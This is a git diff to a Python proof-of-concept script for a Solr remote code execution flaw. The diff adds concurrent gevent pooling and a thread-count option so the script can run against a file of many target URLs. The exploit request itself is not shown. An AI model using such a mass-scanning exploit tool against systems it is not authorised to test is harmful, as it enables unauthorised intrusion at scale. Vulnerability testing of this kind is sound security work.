@@ -3,6 +3,9 @@
 # author: Loneyer
 # date: 2019-11-14
 
+from gevent import monkey;monkey.patch_all()
+from gevent.pool import Pool
+import gevent
 import sys
 import requests
 import re
@@ -43,26 +46,31 @@ def solr_rce_test(url):
     except KeyboardInterrupt:
         print('bye')
     except:
-        print("url:{} not vul".format(url))
+        # pass
+        print("url:{} is error".format(url))
 
-
+def pocexec(url):
+    solr_rce_test(url)
+    gevent.sleep(0)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-f', dest="url_file", help="url.txt")
     parser.add_argument('-url',dest="url",help="http://www.baidu.com")
+    parser.add_argument('-t',dest='threads',type=int,help="threads")
     args = parser.parse_args()
     url = args.url
+    t = args.threads
     urlfile = args.url_file
     if urlfile  == None and url ==None:
         print("""
 url or urlfile is none
 
-ie:python3 solr-rce.py -f url.txt
-   pyrhon3 solr-rce.py -url http://www.google.com
+ie:python3 solr_rce.py -f url.txt
+   pyrhon3 solr_rce.py -url http://www.google.com
         """)
         sys.exit(1)
-    if urlfile!=None:
+    if urlfile!=None and t!=None:
         urllist = []
         with open(str(urlfile)) as f:
             while True:
@@ -71,8 +79,12 @@ ie:python3 solr-rce.py -f url.txt
                     urllist.append(line)
                 else:
                     break
+        try:
+            pool = Pool(t)
+            threads = [pool.spawn(pocexec, url) for url in urllist]
+            gevent.joinall(threads)
+        except KeyboardInterrupt:
+            print('bye :)')
 
-        for url in urllist:
-            solr_rce_test(url)
     elif url!=None:
         solr_rce_test(url)
